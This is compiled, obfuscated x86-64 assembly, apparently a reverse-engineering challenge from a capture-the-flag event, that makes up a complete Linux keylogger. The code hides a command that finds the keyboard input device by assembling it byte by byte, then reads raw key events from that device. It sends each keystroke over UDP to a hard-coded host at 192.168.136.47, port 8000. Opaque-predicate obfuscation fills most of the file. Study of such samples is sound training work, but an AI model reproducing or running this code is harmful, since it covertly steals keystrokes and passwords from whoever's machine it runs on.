	.file	"Spidey-y_AlphaCTF2k23-challs_keylogger_opaque.c"
	.text
	.globl	_TIG_iO_BX1s_1___uint64_identity_1_opaque_ptr_1
	.bss
	.align 8
	.type	_TIG_iO_BX1s_1___uint64_identity_1_opaque_ptr_1, @object
	.size	_TIG_iO_BX1s_1___uint64_identity_1_opaque_ptr_1, 8
_TIG_iO_BX1s_1___uint64_identity_1_opaque_ptr_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_16_1_opaque_list_2
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_16_1_opaque_list_2, @object
	.size	_TIG_iO_BX1s_1___bswap_16_1_opaque_list_2, 8
_TIG_iO_BX1s_1___bswap_16_1_opaque_list_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_32_1_opaque_ptr_2
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_32_1_opaque_ptr_2, @object
	.size	_TIG_iO_BX1s_1___bswap_32_1_opaque_ptr_2, 8
_TIG_iO_BX1s_1___bswap_32_1_opaque_ptr_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_2
	.align 8
	.type	_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_2, @object
	.size	_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_2, 8
_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_2:
	.zero	8
	.globl	_TIG_IZ_BX1s_argc
	.align 4
	.type	_TIG_IZ_BX1s_argc, @object
	.size	_TIG_IZ_BX1s_argc, 4
_TIG_IZ_BX1s_argc:
	.zero	4
	.globl	_TIG_iO_BX1s_1___uint16_identity_1_opaque_list_2
	.align 8
	.type	_TIG_iO_BX1s_1___uint16_identity_1_opaque_list_2, @object
	.size	_TIG_iO_BX1s_1___uint16_identity_1_opaque_list_2, 8
_TIG_iO_BX1s_1___uint16_identity_1_opaque_list_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint32_identity_1_opaque_list_2
	.align 8
	.type	_TIG_iO_BX1s_1___uint32_identity_1_opaque_list_2, @object
	.size	_TIG_iO_BX1s_1___uint32_identity_1_opaque_list_2, 8
_TIG_iO_BX1s_1___uint32_identity_1_opaque_list_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_32_1_opaque_ptr_1
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_32_1_opaque_ptr_1, @object
	.size	_TIG_iO_BX1s_1___bswap_32_1_opaque_ptr_1, 8
_TIG_iO_BX1s_1___bswap_32_1_opaque_ptr_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint64_identity_1_opaque_list_1
	.align 8
	.type	_TIG_iO_BX1s_1___uint64_identity_1_opaque_list_1, @object
	.size	_TIG_iO_BX1s_1___uint64_identity_1_opaque_list_1, 8
_TIG_iO_BX1s_1___uint64_identity_1_opaque_list_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint64_identity_1_opaque_ptr_2
	.align 8
	.type	_TIG_iO_BX1s_1___uint64_identity_1_opaque_ptr_2, @object
	.size	_TIG_iO_BX1s_1___uint64_identity_1_opaque_ptr_2, 8
_TIG_iO_BX1s_1___uint64_identity_1_opaque_ptr_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1
	.align 8
	.type	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1, @object
	.size	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1, 8
_TIG_iO_BX1s_1_execute_command_1_opaque_list_1:
	.zero	8
	.globl	_TIG_IZ_BX1s_argv
	.align 8
	.type	_TIG_IZ_BX1s_argv, @object
	.size	_TIG_IZ_BX1s_argv, 8
_TIG_IZ_BX1s_argv:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint32_identity_1_opaque_ptr_1
	.align 8
	.type	_TIG_iO_BX1s_1___uint32_identity_1_opaque_ptr_1, @object
	.size	_TIG_iO_BX1s_1___uint32_identity_1_opaque_ptr_1, 8
_TIG_iO_BX1s_1___uint32_identity_1_opaque_ptr_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_16_1_opaque_ptr_1
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_16_1_opaque_ptr_1, @object
	.size	_TIG_iO_BX1s_1___bswap_16_1_opaque_ptr_1, 8
_TIG_iO_BX1s_1___bswap_16_1_opaque_ptr_1:
	.zero	8
	.globl	_TIG_IZ_BX1s_envp
	.align 8
	.type	_TIG_IZ_BX1s_envp, @object
	.size	_TIG_IZ_BX1s_envp, 8
_TIG_IZ_BX1s_envp:
	.zero	8
	.globl	_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_1
	.align 8
	.type	_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_1, @object
	.size	_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_1, 8
_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1_main_1_opaque_ptr_1
	.align 8
	.type	_TIG_iO_BX1s_1_main_1_opaque_ptr_1, @object
	.size	_TIG_iO_BX1s_1_main_1_opaque_ptr_1, 8
_TIG_iO_BX1s_1_main_1_opaque_ptr_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_64_1_opaque_list_1
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_64_1_opaque_list_1, @object
	.size	_TIG_iO_BX1s_1___bswap_64_1_opaque_list_1, 8
_TIG_iO_BX1s_1___bswap_64_1_opaque_list_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1_execute_command_1_opaque_list_2
	.align 8
	.type	_TIG_iO_BX1s_1_execute_command_1_opaque_list_2, @object
	.size	_TIG_iO_BX1s_1_execute_command_1_opaque_list_2, 8
_TIG_iO_BX1s_1_execute_command_1_opaque_list_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_16_1_opaque_list_1
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_16_1_opaque_list_1, @object
	.size	_TIG_iO_BX1s_1___bswap_16_1_opaque_list_1, 8
_TIG_iO_BX1s_1___bswap_16_1_opaque_list_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_16_1_opaque_ptr_2
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_16_1_opaque_ptr_2, @object
	.size	_TIG_iO_BX1s_1___bswap_16_1_opaque_ptr_2, 8
_TIG_iO_BX1s_1___bswap_16_1_opaque_ptr_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_32_1_opaque_list_2
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_32_1_opaque_list_2, @object
	.size	_TIG_iO_BX1s_1___bswap_32_1_opaque_list_2, 8
_TIG_iO_BX1s_1___bswap_32_1_opaque_list_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint16_identity_1_opaque_list_1
	.align 8
	.type	_TIG_iO_BX1s_1___uint16_identity_1_opaque_list_1, @object
	.size	_TIG_iO_BX1s_1___uint16_identity_1_opaque_list_1, 8
_TIG_iO_BX1s_1___uint16_identity_1_opaque_list_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1_main_1_opaque_list_2
	.align 8
	.type	_TIG_iO_BX1s_1_main_1_opaque_list_2, @object
	.size	_TIG_iO_BX1s_1_main_1_opaque_list_2, 8
_TIG_iO_BX1s_1_main_1_opaque_list_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint16_identity_1_opaque_ptr_2
	.align 8
	.type	_TIG_iO_BX1s_1___uint16_identity_1_opaque_ptr_2, @object
	.size	_TIG_iO_BX1s_1___uint16_identity_1_opaque_ptr_2, 8
_TIG_iO_BX1s_1___uint16_identity_1_opaque_ptr_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1_main_1_opaque_list_1
	.align 8
	.type	_TIG_iO_BX1s_1_main_1_opaque_list_1, @object
	.size	_TIG_iO_BX1s_1_main_1_opaque_list_1, 8
_TIG_iO_BX1s_1_main_1_opaque_list_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1_main_1_opaque_ptr_2
	.align 8
	.type	_TIG_iO_BX1s_1_main_1_opaque_ptr_2, @object
	.size	_TIG_iO_BX1s_1_main_1_opaque_ptr_2, 8
_TIG_iO_BX1s_1_main_1_opaque_ptr_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_32_1_opaque_list_1
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_32_1_opaque_list_1, @object
	.size	_TIG_iO_BX1s_1___bswap_32_1_opaque_list_1, 8
_TIG_iO_BX1s_1___bswap_32_1_opaque_list_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_64_1_opaque_ptr_2
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_64_1_opaque_ptr_2, @object
	.size	_TIG_iO_BX1s_1___bswap_64_1_opaque_ptr_2, 8
_TIG_iO_BX1s_1___bswap_64_1_opaque_ptr_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint64_identity_1_opaque_list_2
	.align 8
	.type	_TIG_iO_BX1s_1___uint64_identity_1_opaque_list_2, @object
	.size	_TIG_iO_BX1s_1___uint64_identity_1_opaque_list_2, 8
_TIG_iO_BX1s_1___uint64_identity_1_opaque_list_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_64_1_opaque_ptr_1
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_64_1_opaque_ptr_1, @object
	.size	_TIG_iO_BX1s_1___bswap_64_1_opaque_ptr_1, 8
_TIG_iO_BX1s_1___bswap_64_1_opaque_ptr_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint32_identity_1_opaque_ptr_2
	.align 8
	.type	_TIG_iO_BX1s_1___uint32_identity_1_opaque_ptr_2, @object
	.size	_TIG_iO_BX1s_1___uint32_identity_1_opaque_ptr_2, 8
_TIG_iO_BX1s_1___uint32_identity_1_opaque_ptr_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___bswap_64_1_opaque_list_2
	.align 8
	.type	_TIG_iO_BX1s_1___bswap_64_1_opaque_list_2, @object
	.size	_TIG_iO_BX1s_1___bswap_64_1_opaque_list_2, 8
_TIG_iO_BX1s_1___bswap_64_1_opaque_list_2:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint16_identity_1_opaque_ptr_1
	.align 8
	.type	_TIG_iO_BX1s_1___uint16_identity_1_opaque_ptr_1, @object
	.size	_TIG_iO_BX1s_1___uint16_identity_1_opaque_ptr_1, 8
_TIG_iO_BX1s_1___uint16_identity_1_opaque_ptr_1:
	.zero	8
	.globl	_TIG_iO_BX1s_1___uint32_identity_1_opaque_list_1
	.align 8
	.type	_TIG_iO_BX1s_1___uint32_identity_1_opaque_list_1, @object
	.size	_TIG_iO_BX1s_1___uint32_identity_1_opaque_list_1, 8
_TIG_iO_BX1s_1___uint32_identity_1_opaque_list_1:
	.zero	8
	.section	.rodata
.LC0:
	.string	"\n"
.LC1:
	.string	"Error opening file"
.LC2:
	.string	"Error creating socket"
.LC3:
	.string	"192.168.136.47"
.LC4:
	.string	"Error reading from file"
.LC5:
	.string	"Error sending data"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$304, %rsp
	movl	%edi, -276(%rbp)
	movq	%rsi, -288(%rbp)
	movq	%rdx, -296(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	$0, _TIG_IZ_BX1s_envp(%rip)
	nop
.L2:
	movq	$0, _TIG_IZ_BX1s_argv(%rip)
	nop
.L3:
	movl	$0, _TIG_IZ_BX1s_argc(%rip)
	nop
	nop
.L4:
.L5:
#APP
# 110 "/usr/include/x86_64-linux-gnu/bits/byteswap.h" 1
	##_ANNOTATION_INITIALREGION_-TIG-IZ-BX1s--0
# 0 "" 2
#NO_APP
	movl	-276(%rbp), %eax
	movl	%eax, _TIG_IZ_BX1s_argc(%rip)
	movq	-288(%rbp), %rax
	movq	%rax, _TIG_IZ_BX1s_argv(%rip)
	movq	-296(%rbp), %rax
	movq	%rax, _TIG_IZ_BX1s_envp(%rip)
#APP
# 117 "/usr/include/x86_64-linux-gnu/bits/byteswap.h" 1
	##_ANNOTATION_ATOMICREGION_-TIG-iO-BX1s-1-main--15
# 0 "" 2
#NO_APP
	movl	$24, %edi
	call	malloc@PLT
	movq	%rax, -240(%rbp)
	movq	-240(%rbp), %rax
	movq	-240(%rbp), %rdx
	movq	%rdx, 16(%rax)
	movq	-240(%rbp), %rax
	movq	-240(%rbp), %rdx
	movq	%rdx, 8(%rax)
	movq	-240(%rbp), %rax
	movq	%rax, _TIG_iO_BX1s_1_main_1_opaque_list_1(%rip)
	call	rand@PLT
	movl	%eax, -260(%rbp)
	movl	$24, %edi
	call	malloc@PLT
	movq	%rax, -232(%rbp)
	movq	-232(%rbp), %rax
	movl	$0, (%rax)
	movq	_TIG_iO_BX1s_1_main_1_opaque_list_1(%rip), %rax
	movq	16(%rax), %rdx
	movq	-232(%rbp), %rax
	movq	%rdx, 16(%rax)
	movq	_TIG_iO_BX1s_1_main_1_opaque_list_1(%rip), %rdx
	movq	-232(%rbp), %rax
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_main_1_opaque_list_1(%rip), %rax
	movq	16(%rax), %rax
	movq	-232(%rbp), %rdx
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_main_1_opaque_list_1(%rip), %rax
	movq	-232(%rbp), %rdx
	movq	%rdx, 16(%rax)
	call	rand@PLT
	movl	%eax, -256(%rbp)
	movl	$24, %edi
	call	malloc@PLT
	movq	%rax, -224(%rbp)
	movq	-224(%rbp), %rax
	movl	-256(%rbp), %edx
	movl	%edx, (%rax)
	movq	_TIG_iO_BX1s_1_main_1_opaque_list_1(%rip), %rax
	movq	16(%rax), %rdx
	movq	-224(%rbp), %rax
	movq	%rdx, 16(%rax)
	movq	_TIG_iO_BX1s_1_main_1_opaque_list_1(%rip), %rdx
	movq	-224(%rbp), %rax
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_main_1_opaque_list_1(%rip), %rax
	movq	16(%rax), %rax
	movq	-224(%rbp), %rdx
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_main_1_opaque_list_1(%rip), %rax
	movq	-224(%rbp), %rdx
	movq	%rdx, 16(%rax)
	movq	_TIG_iO_BX1s_1_main_1_opaque_list_1(%rip), %rax
	movq	16(%rax), %rax
	movq	%rax, _TIG_iO_BX1s_1_main_1_opaque_ptr_1(%rip)
	movq	_TIG_iO_BX1s_1_main_1_opaque_ptr_1(%rip), %rax
	movq	%rax, _TIG_iO_BX1s_1_main_1_opaque_ptr_2(%rip)
	nop
	nop
	movb	$99, -96(%rbp)
	movb	$97, -95(%rbp)
	movb	$116, -94(%rbp)
	movb	$32, -93(%rbp)
	movb	$47, -92(%rbp)
	movb	$112, -91(%rbp)
	movb	$114, -90(%rbp)
	movb	$111, -89(%rbp)
	movb	$99, -88(%rbp)
	movb	$47, -87(%rbp)
	movb	$98, -86(%rbp)
	movb	$117, -85(%rbp)
	movb	$115, -84(%rbp)
	movb	$47, -83(%rbp)
	movb	$105, -82(%rbp)
	movb	$110, -81(%rbp)
	movb	$112, -80(%rbp)
	movb	$117, -79(%rbp)
	movb	$116, -78(%rbp)
	movb	$47, -77(%rbp)
	movb	$100, -76(%rbp)
	movb	$101, -75(%rbp)
	movb	$118, -74(%rbp)
	movb	$105, -73(%rbp)
	movb	$99, -72(%rbp)
	movb	$101, -71(%rbp)
	movb	$115, -70(%rbp)
	movb	$32, -69(%rbp)
	movb	$124, -68(%rbp)
	movb	$32, -67(%rbp)
	movb	$103, -66(%rbp)
	movb	$114, -65(%rbp)
	movb	$101, -64(%rbp)
	movb	$112, -63(%rbp)
	movb	$32, -62(%rbp)
	movb	$107, -61(%rbp)
	movb	$101, -60(%rbp)
	movb	$121, -59(%rbp)
	movb	$98, -58(%rbp)
	movb	$111, -57(%rbp)
	movb	$97, -56(%rbp)
	movb	$114, -55(%rbp)
	movb	$100, -54(%rbp)
	movb	$32, -53(%rbp)
	movb	$45, -52(%rbp)
	movb	$65, -51(%rbp)
	movb	$32, -50(%rbp)
	movb	$53, -49(%rbp)
	movb	$32, -48(%rbp)
	movb	$124, -47(%rbp)
	movb	$32, -46(%rbp)
	movb	$103, -45(%rbp)
	movb	$114, -44(%rbp)
	movb	$101, -43(%rbp)
	movb	$112, -42(%rbp)
	movb	$32, -41(%rbp)
	movb	$45, -40(%rbp)
	movb	$111, -39(%rbp)
	movb	$32, -38(%rbp)
	movb	$45, -37(%rbp)
	movb	$69, -36(%rbp)
	movb	$32, -35(%rbp)
	movb	$32, -34(%rbp)
	movb	$39, -33(%rbp)
	movb	$101, -32(%rbp)
	movb	$118, -31(%rbp)
	movb	$101, -30(%rbp)
	movb	$110, -29(%rbp)
	movb	$116, -28(%rbp)
	movb	$91, -27(%rbp)
	movb	$48, -26(%rbp)
	movb	$45, -25(%rbp)
	movb	$57, -24(%rbp)
	movb	$93, -23(%rbp)
	movb	$43, -22(%rbp)
	movb	$39, -21(%rbp)
	movb	$0, -20(%rbp)
	leaq	-96(%rbp), %rax
	movq	%rax, %rdi
	call	execute_command
	movq	%rax, -216(%rbp)
	movq	-216(%rbp), %rax
	movq	%rax, -208(%rbp)
	movb	$47, -160(%rbp)
	movb	$100, -159(%rbp)
	movb	$101, -158(%rbp)
	movb	$118, -157(%rbp)
	movb	$47, -156(%rbp)
	movb	$105, -155(%rbp)
	movb	$110, -154(%rbp)
	movb	$112, -153(%rbp)
	movb	$117, -152(%rbp)
	movb	$116, -151(%rbp)
	movb	$47, -150(%rbp)
	movb	$0, -149(%rbp)
	movl	$12, -268(%rbp)
	jmp	.L6
.L7:
	movl	-268(%rbp), %eax
	movb	$0, -160(%rbp,%rax)
	addl	$1, -268(%rbp)
.L6:
	cmpl	$18, -268(%rbp)
	jbe	.L7
	movq	-208(%rbp), %rdx
	leaq	-160(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	strcat@PLT
	leaq	-160(%rbp), %rax
	leaq	.LC0(%rip), %rdx
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	strcspn@PLT
	movq	%rax, -200(%rbp)
	movq	-200(%rbp), %rax
	movl	%eax, -252(%rbp)
	movl	-252(%rbp), %eax
	cltq
	movb	$0, -160(%rbp,%rax)
	leaq	-160(%rbp), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -248(%rbp)
	movq	_TIG_iO_BX1s_1_main_1_opaque_ptr_1(%rip), %rdx
	movq	_TIG_iO_BX1s_1_main_1_opaque_ptr_2(%rip), %rax
	cmpq	%rax, %rdx
	jne	.L8
	cmpl	$0, -248(%rbp)
	jns	.L8
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	exit@PLT
.L8:
	movq	-208(%rbp), %rax
	movq	%rax, %rdi
	call	free@PLT
	movl	$0, %edx
	movl	$2, %esi
	movl	$2, %edi
	call	socket@PLT
	movl	%eax, -244(%rbp)
	cmpl	$0, -244(%rbp)
	jns	.L9
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	exit@PLT
.L9:
	movw	$2, -176(%rbp)
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	call	inet_addr@PLT
	movl	%eax, -172(%rbp)
	movl	$8000, %edi
	call	htons@PLT
	movw	%ax, -174(%rbp)
.L14:
	leaq	-128(%rbp), %rcx
	movl	-248(%rbp), %eax
	movl	$24, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	read@PLT
	movq	%rax, -192(%rbp)
	cmpq	$24, -192(%rbp)
	je	.L10
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	exit@PLT
.L10:
	movl	$16, -264(%rbp)
	jmp	.L11
.L13:
	movl	-264(%rbp), %eax
	cltq
	movzbl	-128(%rbp,%rax), %eax
	movb	%al, -269(%rbp)
	leaq	-176(%rbp), %rdx
	leaq	-269(%rbp), %rsi
	movl	-244(%rbp), %eax
	movl	$16, %r9d
	movq	%rdx, %r8
	movl	$0, %ecx
	movl	$1, %edx
	movl	%eax, %edi
	call	sendto@PLT
	movq	%rax, -184(%rbp)
	cmpq	$0, -184(%rbp)
	jns	.L12
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	call	perror@PLT
	movl	$1, %edi
	call	exit@PLT
.L12:
	addl	$1, -264(%rbp)
.L11:
	cmpl	$21, -264(%rbp)
	jle	.L13
	jmp	.L14
	.cfi_endproc
.LFE4:
	.size	main, .-main
	.section	.rodata
.LC6:
	.string	"Failed to allocate memory"
.LC7:
	.string	"r"
.LC8:
	.string	"Failed to run command"
	.text
	.globl	execute_command
	.type	execute_command, @function
execute_command:
.LFB5:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$256, %rsp
	movq	%rdi, -248(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
#APP
# 126 "Spidey-y_AlphaCTF2k23-challs_keylogger.c" 1
	##_ANNOTATION_INITIALREGION_-TIG-iO-BX1s-1-execute-command--14
# 0 "" 2
# 130 "Spidey-y_AlphaCTF2k23-challs_keylogger.c" 1
	##_ANNOTATION_ATOMICREGION_-TIG-iO-BX1s-1-execute-command--13
# 0 "" 2
#NO_APP
	movl	$24, %edi
	call	malloc@PLT
	movq	%rax, -224(%rbp)
	movq	-224(%rbp), %rax
	movq	-224(%rbp), %rdx
	movq	%rdx, (%rax)
	movq	-224(%rbp), %rax
	movq	-224(%rbp), %rdx
	movq	%rdx, 8(%rax)
	movq	-224(%rbp), %rax
	movq	%rax, _TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip)
	call	rand@PLT
	movl	%eax, -240(%rbp)
	movl	$24, %edi
	call	malloc@PLT
	movq	%rax, -216(%rbp)
	movq	-216(%rbp), %rax
	movl	$0, 16(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	(%rax), %rdx
	movq	-216(%rbp), %rax
	movq	%rdx, (%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rdx
	movq	-216(%rbp), %rax
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	(%rax), %rax
	movq	-216(%rbp), %rdx
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	-216(%rbp), %rdx
	movq	%rdx, (%rax)
	call	rand@PLT
	movl	%eax, -236(%rbp)
	movl	$24, %edi
	call	malloc@PLT
	movq	%rax, -208(%rbp)
	movq	-208(%rbp), %rax
	movl	-236(%rbp), %edx
	movl	%edx, 16(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	(%rax), %rdx
	movq	-208(%rbp), %rax
	movq	%rdx, (%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rdx
	movq	-208(%rbp), %rax
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	(%rax), %rax
	movq	-208(%rbp), %rdx
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	-208(%rbp), %rdx
	movq	%rdx, (%rax)
	call	rand@PLT
	movl	%eax, -232(%rbp)
	movl	$24, %edi
	call	malloc@PLT
	movq	%rax, -200(%rbp)
	movl	-232(%rbp), %eax
	leal	(%rax,%rax), %edx
	movq	-200(%rbp), %rax
	movl	%edx, 16(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	(%rax), %rdx
	movq	-200(%rbp), %rax
	movq	%rdx, (%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rdx
	movq	-200(%rbp), %rax
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	(%rax), %rax
	movq	-200(%rbp), %rdx
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	-200(%rbp), %rdx
	movq	%rdx, (%rax)
	call	rand@PLT
	movl	%eax, -228(%rbp)
	movl	$24, %edi
	call	malloc@PLT
	movq	%rax, -192(%rbp)
	movl	-228(%rbp), %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%eax, %edx
	movq	-192(%rbp), %rax
	movl	%edx, 16(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	(%rax), %rdx
	movq	-192(%rbp), %rax
	movq	%rdx, (%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rdx
	movq	-192(%rbp), %rax
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	(%rax), %rax
	movq	-192(%rbp), %rdx
	movq	%rdx, 8(%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	-192(%rbp), %rdx
	movq	%rdx, (%rax)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_list_1(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, _TIG_iO_BX1s_1_execute_command_1_opaque_ptr_1(%rip)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_1(%rip), %rax
	movq	%rax, _TIG_iO_BX1s_1_execute_command_1_opaque_ptr_2(%rip)
	movq	_TIG_iO_BX1s_1_execute_command_1_opaque_ptr_2(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, _TIG_iO_BX1s_1_execute_command_1_opaque_ptr_2(%rip)
	nop
	nop
	movq	_TIG_iO_BX1s_1_main_1_opaque_ptr_1(%rip), %rdx
	movq	_TIG_iO_BX1s_1_main_1_opaque_ptr_2(%rip), %rax
	cmpq	%rax, %rdx
	je	.L17
	movq	-184(%rbp), %rax
	movq	%rax, %rdi
	call	execute_command
	movq	%rax, -176(%rbp)
.L17:
	movl	$4096, %edi
	call	malloc@PLT
	movq	%rax, -168(%rbp)
	movq	-168(%rbp), %rax
	movq	%rax, -176(%rbp)
	cmpq	$0, -176(%rbp)
	jne	.L18
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L18:
	movq	-176(%rbp), %rax
	movb	$0, (%rax)
	movq	-248(%rbp), %rax
	leaq	.LC7(%rip), %rdx
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	popen@PLT
	movq	%rax, -160(%rbp)
	movq	-160(%rbp), %rax
	movq	%rax, -152(%rbp)
	cmpq	$0, -152(%rbp)
	jne	.L19
	leaq	.LC8(%rip), %rax
	movq	%rax, %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L19:
	movq	-152(%rbp), %rdx
	leaq	-144(%rbp), %rax
	movl	$128, %esi
	movq	%rax, %rdi
	call	fgets@PLT
	movq	%rax, -184(%rbp)
	cmpq	$0, -184(%rbp)
	je	.L25
	leaq	-144(%rbp), %rdx
	movq	-176(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	strcat@PLT
	jmp	.L19
.L25:
	nop
	movq	-152(%rbp), %rax
	movq	%rax, %rdi
	call	pclose@PLT
	movq	-176(%rbp), %rax
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L23
	call	__stack_chk_fail@PLT
.L23:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE5:
	.size	execute_command, .-execute_command
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
